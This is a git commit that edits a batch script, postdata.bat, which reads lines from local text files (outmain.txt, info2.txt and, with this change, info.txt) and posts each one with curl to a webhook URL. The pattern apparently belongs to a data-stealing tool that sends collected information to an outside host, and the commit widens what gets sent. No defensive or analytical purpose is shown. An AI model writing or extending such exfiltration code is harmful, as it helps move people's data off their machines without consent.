f4c1885c39257448d54ee2f4ca7d2005232232c6
BOBZERO-afk <thom25k5@aabenraaskoler.dk>
2026-03-26 10:47:20 +0100

    Enhance postdata.bat to include info.txt
    Added functionality to read from info.txt and post data.

--- postdata.bat
+++ postdata.bat
@@ -6,4 +6,7 @@ for /f "usebackq delims=" %%A in ("outmain.txt") do (
 for /f "usebackq delims=" %%A in ("info2.txt") do (
     curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
 )
+for /f "usebackq delims=" %%A in ("info.txt") do (
+    curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
+)
 exit /b 0
